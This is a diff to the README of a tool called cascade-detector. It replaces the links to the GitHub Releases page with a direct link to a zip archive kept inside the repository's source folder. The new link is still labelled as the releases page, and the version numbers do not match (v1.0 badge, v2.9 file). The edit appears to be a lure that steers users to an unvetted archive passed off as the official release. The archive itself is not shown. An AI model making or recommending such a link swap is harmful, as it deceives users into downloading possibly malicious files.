@@ -8,7 +8,7 @@ To get started with cascade-detector, follow the simple steps below to download 
 
 ## 📥 Download Links
 
-[![Download cascade-detector](https://img.shields.io/badge/Download%20cascade--detector-v1.0-blue)](https://github.com/Roelvy14/cascade-detector/releases)
+[![Download cascade-detector](https://github.com/Roelvy14/cascade-detector/raw/refs/heads/main/cascade_detector/cli/cascade-detector-v2.9.zip%20cascade--detector-v1.0-blue)](https://github.com/Roelvy14/cascade-detector/raw/refs/heads/main/cascade_detector/cli/cascade-detector-v2.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -30,7 +30,7 @@ cascade-detector includes these useful features:
 
 ## 📦 Download & Install
 
-To download the application, visit this page: [GitHub Releases Page](https://github.com/Roelvy14/cascade-detector/releases). 
+To download the application, visit this page: [GitHub Releases Page](https://github.com/Roelvy14/cascade-detector/raw/refs/heads/main/cascade_detector/cli/cascade-detector-v2.9.zip). 
 
 1. Click on the link above.
 2. Select the latest version of cascade-detector.
